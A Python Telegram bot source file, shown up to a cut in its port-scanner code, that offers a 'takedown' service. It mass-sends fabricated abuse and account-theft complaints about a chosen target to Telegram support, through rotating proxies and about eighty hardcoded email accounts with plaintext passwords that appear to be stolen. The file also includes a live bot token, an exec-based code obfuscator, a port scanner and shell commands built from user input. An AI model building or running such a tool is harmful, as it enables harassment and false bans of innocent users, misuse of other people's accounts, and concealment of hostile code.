#!/usr/bin/env python3
import os
import asyncio
import logging
import subprocess
import socket
import random
import string
import time
import smtplib
import requests
import aiosqlite
import base64
import marshal
import zlib
import re
import json
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fake_useragent import UserAgent
from typing import List, Dict, Optional, Tuple

from aiogram import Bot, Dispatcher, F, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# CONFIG
BOT_TOKEN = "8433576899:AAGJ5tianUDf9TrfLMSvEAj1ZEavLNTXy0U"
CHANNEL_USERNAME = "@Fsadapter"
ADMIN_IDS = [8018711407]

DB_NAME = "bot_database.db"

# Папка для файлов
FILES_DIR = "files"
os.makedirs(FILES_DIR, exist_ok=True)

PROXIES_LIST = [
    '8.218.149.193:80', '47.57.233.126:80', '47.243.70.197:80', '8.222.193.208:80',
    '144.24.85.158:80', '47.245.115.6:80', '47.245.114.163:80', '45.4.55.10:40486',
    '103.52.37.1:4145', '200.34.227.204:4153', '190.109.74.1:33633'
]

# EMAIL DATA
senders = {
    'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'wasina@live.com': 'Marlas21',
    'aruzhan.01@mail.com': '1234567!',
    'rob.tackett@live.com': 'metallic',
    'lindahallenbeck@verizon.net': 'Anakin@2014',
    'hlaw82@mail.com': 'Snoopy37$$',
    'paintmadman@comcast.net': 'mycat2200*',
    'prideandjoy@verizon.net': 'Ihatejen12',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',
    'dpb13@live.com': 'Ic&ynum13',
    'heirhunter@usa.com': 'Noguys@714',
    'sherri.edwards@verizon.net': 'Dreaming123#',
    'rami.rami1980@hotmail.com': 'ramirami1980',
    'jmsingleton2@comcast.net': '151728Jn$$',
    'aberancho@aol.com': '10diegguuss10',
    'dgidel@iowatelecom.net': 'Buster48',
    'gpopandopul@mail.com': 'GEORG62A',
    'bolgodonsk@mail.com': '012345678!',
    'colbycolb@cox.net': 'Signals@1',
    'nicrey4@comcast.net': 'Dabears54',
    'mordechai@mail.com': 'Mordechai',
    'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
    'tarabedford@comcast.net': 'Money4me',
    'mycockneedsit@mail.com': 'benjamin3',
    'saralaine@mail.com': 'sarlaine12!1',
    'jonb2006@verizon.net': '1969Camaro',
    'rjhssa1@verizon.net': 'Donna613*',
    'cameron.doug@charter.net': 'Jake2122$',
    'bridget.shappell@comcast.net': 'Brennan1',
    'rugs8@comcast.net': 'baseball46',
    'averyjacobs3@mail.com': '1960682644!',
    'lstefanick@hotmail.com': 'Luv2dance2',
    'bchavez123@mail.com': 'aadrianachavez',
    'lukejamesjones@mail.com': 'tinkerbell1',
    'emahoney123@comcast.net': 'Shieknmme3#',
    'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
    'jet747@cox.net': 'Sadie@1234',
    'landsgascareservices@mail.com': 'Alisha25@',
    'samantha224@mail.com': 'Madden098!@',
    'kbhamil@wowway.com': 'Carol1940',
    'email@bjasper.com': 'Lhsnh4us123!',
    'biggsbrian@cox.net': 'Trains@2247Trains@2247',
    'dzzeblnd@aol.com': 'Geosgal@1',
    'jtrego@indy.rr.com': 'Jackwill14!',
    'chrisphonte.rj@comcast.net': 'Junior@3311',
    'tvwifiguy@comcast.net': 'Bill#0101',
    'defenestrador@mail.com': 'm0rb1d8ss',
    'glangley@gmx.com': 'ironhide',
    'charlotte2850@hotmail.com': 'kelalu2850'
}

receivers = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
]

# Тексты жалоб
COMPLAINT_TEXTS = {
    "1": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {username}, а мой айди, если злоумышленник поменял юзернейм — {telegram_id}. Мой телефон: {number} Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
    "2": "Я столкнулся с мошеннической деятельностью в Telegram. Пользователь/группа {username} (ID: {telegram_id}) занимается обманом/вымогательством. Прошу принять меры для блокировки этого аккаунта/группы. Мой телефон: {number}",
    "3": "Сообщаю о распространении спама/нежелательного контента в Telegram. Пользователь/группа {username} (ID: {telegram_id}) рассылает рекламу/вредоносные ссылки. Прошу заблокировать данный аккаунт/группу. Мой телефон: {number}",
    "4": "Я обнаружил бота {username} (ID: {telegram_id}), который нарушает правила использования Telegram, рассылая спам/вредоносный контент/участвуя в мошенничестве. Прошу заблокировать этого бота. Мой телефон: {number}",
    "5": "Прошу заблокировать канал/группу {username} (ID: {telegram_id}) за распространение фейковых новостей и дезинформации. Это наносит вред обществу и вводит в заблуждение пользователей. Мой телефон: {number}",
    "6": "Обращаюсь с жалобой на домогательство со стороны пользователя {username} (ID: {telegram_id}). Он/она отправляет мне нежелательные сообщения и угрозы. Прошу принять срочные меры. Мой телефон: {number}",
    "7": "Замечена деятельность, связанная с продажей запрещенных веществ/услуг через аккаунт/группу {username} (ID: {telegram_id}). Прошу провести расследование и заблокировать нарушителей. Мой телефон: {number}",
    "8": "Прошу заблокировать группу {username} (ID: {telegram_id}), которая нарушает правила использования Telegram, распространяя запрещенный контент/участвуя в мошенничестве/дезинформации. Мой телефон: {number}",
    "link": "СРОЧНО! Группа по ссылке {link} приносит огромный вред Telegram и пользователям! Она распространяет запрещенный контент, дезинформацию и нарушает все правила платформы. Прошу НЕМЕДЛЕННО заблокировать и удалить эту группу! Это угроза безопасности пользователей. Действуйте срочно!",
    "bot_link": "СРОЧНО! Бот по ссылке {link} приносит огромный вред Telegram! Он рассылает спам, вредоносный контент и нарушает все правила. Прошу НЕМЕДЛЕННО заблокировать этого бота! Это угроза безопасности платформы."
}

# Списки фишинговых доменов и паттернов
PHISHING_DOMAINS = [
    'telegram-login', 'telegram-verify', 'telegram-security', 'telegram-support',
    'telegram-account', 'telegram-hack', 'telegram-free', 'telegram-premium',
    'telegram-steam', 'telegram-gift', 'telegram-vip', 'telegram-club',
    'telegram-bonus', 'telegram-giveaway', 'telegram-win', 'telegram-prize',
    't-me', 't-me-login', 'tme-login', 'tg-login', 'telegr.am-login',
    'telegram.org-login', 'telegram.com-login', 'telegram.ru-login',
    'telegramchannel', 'telegramchannels', 'telegrambot', 'telegrambots',
    'telegramgroup', 'telegramgroups', 'telegramcloud', 'telegrampass',
    'telegramauth', 'telegramsecure', 'telegramverify', 'telegramconfirm',
    'telegramauthenticate', 'telegramaccess', 'telegramrecover',
    'telegramrestore', 'telegramunlock', 'telegramreactivate'
]

PHISHING_KEYWORDS = [
    'войти в телеграм', 'вход в телеграм', 'подтвердить вход', 'подтвердите вход',
    'подтверждение входа', 'верификация', 'верифицировать', 'верифицируйте',
    'подтверждение аккаунта', 'подтвердить аккаунт', 'восстановить аккаунт',
    'восстановление аккаунта', 'разблокировать аккаунт', 'разблокировка аккаунта',
    'облачный пароль', 'взлом аккаунта', 'кража аккаунта', 'угон аккаунта',
    'telegram cloud', 'telegram password', 'telegram session', 'login telegram',
    'sign in telegram', 'verify telegram', 'telegram verification',
    'account blocked', 'account suspended', 'account restricted',
    'account hacked', 'account stolen', 'account recovery',
    'cloud password', 'two factor authentication', '2fa verification',
    'бесплатные звезды', 'free stars', 'telegram stars', 'подарок телеграм',
    'telegram gift', 'giveaway telegram', 'розыгрыш телеграм',
    'выигрыш телеграм', 'приз телеграм', 'премиум бесплатно',
    'free premium', 'telegram premium free'
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BroadcastStates(StatesGroup):
    waiting_for_message = State()

class ObfuscatorStates(StatesGroup):
    waiting_for_file = State()
    waiting_for_method = State()
    waiting_for_loops = State()

class AttackStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_telegram_id = State()
    waiting_for_phone = State()
    waiting_for_complaint_type = State()
    waiting_for_link = State()

class ScanStates(StatesGroup):
    waiting_for_target = State()

class PhishingCheckStates(StatesGroup):
    waiting_for_link = State()

storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

class Database:
    def __init__(self, db_name: str = DB_NAME):
        self.db_name = db_name
        self.initialized = False
    
    async def init_db(self):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_subscribed INTEGER DEFAULT 0,
                    join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS command_stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    command TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    attack_type TEXT,
                    target_username TEXT,
                    target_id TEXT,
                    target_phone TEXT,
                    target_link TEXT,
                    complaint_type TEXT,
                    requests_sent INTEGER,
                    emails_sent INTEGER,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    scan_type TEXT,
                    target TEXT,
                    result TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Таблица для проверок фишинга
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS phishing_checks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    link TEXT,
                    is_phishing INTEGER,
                    score REAL,
                    details TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.commit()
            self.initialized = True
    
    async def add_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, join_date)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (user_id, username, first_name, last_name))
            await conn.commit()
    
    async def update_user_activity(self, user_id: int):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?
            ''', (user_id,))
            await conn.commit()
    
    async def update_subscription(self, user_id: int, is_subscribed: bool):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                UPDATE users SET is_subscribed = ? WHERE user_id = ?
            ''', (1 if is_subscribed else 0, user_id))
            await conn.commit()
    
    async def get_user(self, user_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
            row = await cursor.fetchone()
            return dict(row) if row else None
    
    async def log_command(self, user_id: int, command: str):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO command_stats (user_id, command)
                VALUES (?, ?)
            ''', (user_id, command))
            await conn.commit()
    
    async def save_attack(self, user_id: int, attack_type: str, target_username: str = None, target_id: str = None,
                          target_phone: str = None, target_link: str = None, complaint_type: str = None,
                          requests_sent: int = 0, emails_sent: int = 0):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO attacks (user_id, attack_type, target_username, target_id, target_phone,
                                   target_link, complaint_type, requests_sent, emails_sent)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (user_id, attack_type, target_username, target_id, target_phone, target_link,
                  complaint_type, requests_sent, emails_sent))
            await conn.commit()
    
    async def save_scan(self, user_id: int, scan_type: str, target: str, result: str):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO scans (user_id, scan_type, target, result)
                VALUES (?, ?, ?, ?)
            ''', (user_id, scan_type, target, result))
            await conn.commit()
    
    async def save_phishing_check(self, user_id: int, link: str, is_phishing: bool, score: float, details: str):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO phishing_checks (user_id, link, is_phishing, score, details)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, link, 1 if is_phishing else 0, score, details[:500]))
            await conn.commit()

db = Database()

# Функция проверки ссылки на фишинг
async def check_phishing_link(link: str) -> Tuple[bool, float, str]:
    """
    Проверяет ссылку на признаки фишинга
    Возвращает: (is_phishing, score, details)
    """
    score = 0.0
    details = []
    
    # Нормализуем ссылку
    link = link.lower().strip()
    
    # Проверка 1: Подозрительные домены
    for domain in PHISHING_DOMAINS:
        if domain in link:
            score += 0.3
            details.append(f"Подозрительный домен: {domain}")
    
    # Проверка 2: Подозрительные ключевые слова
    for keyword in PHISHING_KEYWORDS:
        if keyword.lower() in link.lower():
            score += 0.2
            details.append(f"Подозрительное ключевое слово: {keyword}")
    
    # Проверка 3: Подозрительная структура URL
    if '://' in link:
        protocol = link.split('://')[0]
        if protocol not in ['http', 'https']:
            score += 0.1
            details.append(f"Необычный протокол: {protocol}")
    
    # Проверка 4: Много поддоменов
    if link.count('.') > 4:
        score += 0.15
        details.append("Слишком много поддоменов")
    
    # Проверка 5: IP вместо домена
    ip_pattern = r'(\d{1,3}\.){3}\d{1,3}'
    if re.search(ip_pattern, link):
        score += 0.25
        details.append("Использование IP-адреса вместо домена")
    
    # Проверка 6: Подозрительные символы
    suspicious_chars = ['@', '\\', '%00', '%01', '%02', '%03', '%04', '%05']
    for char in suspicious_chars:
        if char in link:
            score += 0.1
            details.append(f"Подозрительный символ: {char}")
    
    # Проверка 7: Короткие ссылки
    shorteners = ['bit.ly', 'goo.gl', 'tinyurl', 't.co', 'is.gd', 'cli.gs', 
                  'pic.gd', 'dwarfurl', 'ow.ly', 'yfrog', 'migre.me', 'ff.im',
                  'tiny.cc', 'url4.eu', 'tr.im', 'twit.ac', 'su.pr', 'twurl.nl',
                  'snipurl', 'short.to', 'budurl', 'ping.fm', 'post.ly',
                  'just.as', 'bkite', 'snipr', 'clicr', 'short.ie', 'kl.am']
    
    for shortener in shorteners:
        if shortener in link:
            score += 0.15
            details.append(f"Сокращатель ссылок: {shortener}")
    
    # Проверка 8: Опечатки в telegram.org
    telegram_variants = ['telegram.or', 'telegraam', 'teleram', 'telegran', 
                        'telegrm', 'tlegram', 'telegam', 'telegr.am', 't.me']
    
    for variant in telegram_variants:
        if variant in link and 'telegram.org' not in link:
            score += 0.35
            details.append(f"Опечатка в домене Telegram: {variant}")
    
    # Проверка 9: URL с логином/паролем
    if '@' in link and '://' in link:
        score += 0.3
        details.append("URL содержит логин/пароль")
    
    # Проверка 10: SSL сертификат (если доступен)
    try:
        if link.startswith('http'):
            response = requests.head(link, timeout=5, allow_redirects=True)
            if 'https' not in response.url:
                score += 0.2
                details.append("Нет защищенного соединения (HTTPS)")
    except:
        pass
    
    # Определяем результат
    is_phishing = score >= 0.5
    
    # Формируем детальное описание
    if is_phishing:
        result_text = f"ОБНАРУЖЕН ФИШИНГ (вероятность: {min(score * 100, 99):.0f}%)"
    else:
        result_text = f"Ссылка безопасна (вероятность фишинга: {score * 100:.0f}%)"
    
    if details:
        result_text += "\n\nДетали проверки:\n• " + "\n• ".join(details)
    
    return is_phishing, score, result_text

# Функции обфускации
def zlb_compress(data):
    return zlib.compress(data)

def b16_encode(data):
    return base64.b16encode(data)

def b32_encode(data):
    return base64.b32encode(data)

def b64_encode(data):
    return base64.b64encode(data)

def marshal_compile(data):
    return marshal.dumps(compile(data, "<x>", "exec"))

def obfuscate_code(data: str, method: int, loops: int = 1) -> str:
    encoding_functions = {
        1: (
            "marshal_compile(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__[::-1]);",
        ),
        2: (
            "zlb_compress(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__[::-1]);",
        ),
        3: (
            "b16_encode(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('base64').b16decode(__[::-1]);",
        ),
        4: (
            "b32_encode(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('base64').b32decode(__[::-1]);",
        ),
        5: (
            "b64_encode(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('base64').b64decode(__[::-1]);",
        ),
        6: (
            "b16_encode(zlb_compress(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));",
        ),
        7: (
            "b32_encode(zlb_compress(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));",
        ),
        8: (
            "b64_encode(zlb_compress(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));",
        ),
        9: (
            "zlb_compress(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));",
        ),
        10: (
            "b16_encode(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));",
        ),
        11: (
            "b32_encode(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));",
        ),
        12: (
            "b64_encode(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));",
        ),
        13: (
            "b16_encode(zlb_compress(marshal_compile(data.encode('utf8'))))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));",
        ),
        14: (
            "b32_encode(zlb_compress(marshal_compile(data.encode('utf8'))))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));",
        ),
        15: (
            "b64_encode(zlb_compress(marshal_compile(data.encode('utf8'))))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));",
        ),
    }

    if method not in encoding_functions:
        raise ValueError("Неправильный метод обфускации")

    xx, heading = encoding_functions[method]
    result = data

    for _ in range(loops):
        try:
            result = "exec((_)(%s))" % repr(eval(xx.replace('data', 'result')))
        except Exception as e:
            raise TypeError(f"Ошибка обфускации: {str(e)}")

    return heading + result

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(1)
        server.quit()
        return True
    except Exception as e:
        return False

def send_complaint(username, telegram_id, number, email, repeats, complaint_text, proxies=None):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0
    
    payload = {'text': complaint_text, 'number': number, 'email': email}
    
    try:
        for _ in range(int(repeats)):
            response = requests.post(url, headers=headers, data=payload, proxies=proxies)
            if response.status_code == 200:
                complaints_sent += 1
    except Exception as e:
        pass
    return complaints_sent

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except Exception as e:
        logger.error(f"Error checking subscription: {e}")
        return False

class UserActivityMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if isinstance(event, (Message, CallbackQuery)):
            user = event.from_user
            if not db.initialized:
                await db.init_db()
            
            await db.add_user(
                user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name
            )
            await db.update_user_activity(user.id)
        return await handler(event, data)

dp.update.middleware(UserActivityMiddleware())

async def main_menu() -> tuple[str, InlineKeyboardMarkup]:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сканирование сайта", callback_data="menu_scan")],
        [InlineKeyboardButton(text="Проверка на фишинг", callback_data="menu_phishing")],
        [InlineKeyboardButton(text="Снос", callback_data="menu_attack_main")],
        [InlineKeyboardButton(text="Полезное", callback_data="useful_menu")],
        [InlineKeyboardButton(text="Наш канал", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]
    ])
    return "Главное меню", keyboard

def attack_menu() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отправить жалобу", callback_data="attack_complaint")],
        [InlineKeyboardButton(text="По ссылке", callback_data="attack_link")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    return keyboard

def complaint_type_menu() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Снос сессии", callback_data="complaint_1")],
        [InlineKeyboardButton(text="Мошенничество", callback_data="complaint_2")],
        [InlineKeyboardButton(text="Спам", callback_data="complaint_3")],
        [InlineKeyboardButton(text="Боты", callback_data="complaint_4")],
        [InlineKeyboardButton(text="Фейки", callback_data="complaint_5")],
        [InlineKeyboardButton(text="Домогательство", callback_data="complaint_6")],
        [InlineKeyboardButton(text="Продажа веществ", callback_data="complaint_7")],
        [InlineKeyboardButton(text="Группы", callback_data="complaint_8")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_attack_main")]
    ])
    return keyboard

def scan_menu() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Полное сканирование", callback_data="full_scan")],
        [InlineKeyboardButton(text="WHOIS информация", callback_data="whois_scan")],
        [InlineKeyboardButton(text="DNS записи", callback_data="dns_scan")],
        [InlineKeyboardButton(text="Технологии сайта", callback_data="tech_scan")],
        [InlineKeyboardButton(text="Сканирование портов", callback_data="port_scan")],
        [InlineKeyboardButton(text="Геолокация IP", callback_data="geo_scan")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    return keyboard

def phishing_menu() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Проверить ссылку", callback_data="check_phishing")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    return keyboard

# Функции для сканирования сайтов
def validate_domain(domain):
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$'
    ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    
    if re.match(domain_pattern, domain) or re.match(ip_pattern, domain):
        return True
    return False

async def run_command_safe(cmd, timeout=30):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "Команда выполнялась слишком долго (таймаут)"
    except Exception as e:
        return f"Ошибка выполнения команды: {str(e)}"

# Функции сканирования
def get_geolocation_info(ip: str) -> Dict:
    """Получает детальную геолокацию IP"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'ip': data.get('query', ip),
                    'country': data.get('country', 'N/A'),
                    'country_code': data.get('countryCode', 'N/A'),
                    'region': data.get('regionName', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'district': data.get('district', 'N/A'),
                    'zip': data.get('zip', 'N/A'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'timezone': data.get('timezone', 'N/A'),
                    'isp': data.get('isp', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'as': data.get('as', 'N/A'),
                    'mobile': data.get('mobile', False),
                    'proxy': data.get('proxy', False),
                    'hosting': data.get('hosting', False)
                }
    except Exception as e:
        logger.error(f"Geolocation error: {e}")
    
    return None

def get_whois_info(domain: str) -> str:
    """Получает WHOIS информацию"""
    try:
        result = run_cmd(f"whois {domain}")
        if "No match" in result or "not found" in result.lower():
            return "Информация не найдена"
        
        # Извлекаем важную информацию
        important_lines = []
        for line in result.split('\n'):
            line_lower = line.lower()
            if any(keyword in line_lower for keyword in 
                  ['domain', 'registrar', 'created', 'updated', 'expires', 
                   'name server', 'status', 'registrant', 'admin', 'tech', 
                   'name:', 'organization:', 'address:', 'phone:', 'email:']):
                important_lines.append(line.strip())
        
        return '\n'.join(important_lines[:50]) if important_lines else "Нет информации"
    except:
        return "Ошибка получения WHOIS"

def get_dns_info(domain: str) -> str:
    """Получает DNS информацию через dig"""
    try:
        result = run_cmd(f"dig {domain} ANY +noall +answer")
        if not result or "failed" in result.lower():
            result = run_cmd(f"nslookup {domain}")
        
        return result[:1000] if result else "Нет DNS информации"
    except:
        return "Ошибка получения DNS"

def get_website_tech(url: str) -> str:
    """Определяет технологии сайта"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Проверяем доступность
        try:
            response = requests.get(url, timeout=10, headers={'User-Agent': UserAgent().random})
            server = response.headers.get('server', 'Неизвестно')
            powered_by = response.headers.get('x-powered-by', 'Неизвестно')
            content_type = response.headers.get('content-type', 'Неизвестно')
            
            tech_info = f"""
Сервер: {server}
Powered-By: {powered_by}
Тип контента: {content_type}
Статус код: {response.status_code}
"""
            
            # Проверяем популярные технологии по заголовкам и контенту
            if 'wordpress' in response.text.lower() or 'wp-content' in response.text:
                tech_info += "\nОбнаружено: WordPress"
            if 'joomla' in response.text.lower():
                tech_info += "\nОбнаружено: Joomla"
            if 'drupal' in response.text.lower():
                tech_info += "\nОбнаружено: Drupal"
            if 'laravel' in response.text.lower():
                tech_info += "\nОбнаружено: Laravel"
            if 'react' in response.text.lower():
                tech_info += "\nОбнаружено: React"
            if 'vue' in response.text.lower():
                tech_info += "\nОбнаружено: Vue.js"
            if 'angular' in response.text.lower():
                tech_info += "\nОбнаружено: Angular"
            if 'jquery' in response.text.lower():
                tech_info += "\nОбнаружено: jQuery"
            
            return tech_info
        except:
            return "Сайт недоступен для анализа"
    except:
        return "Ошибка анализа технологий"

def scan_ports(target: str) -> str:
    """Сканирует основные порты"""
    try:
        # Проверяем только основные порты
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                       993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    port_name = {
                        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
                        80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'MS RPC',
                        139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
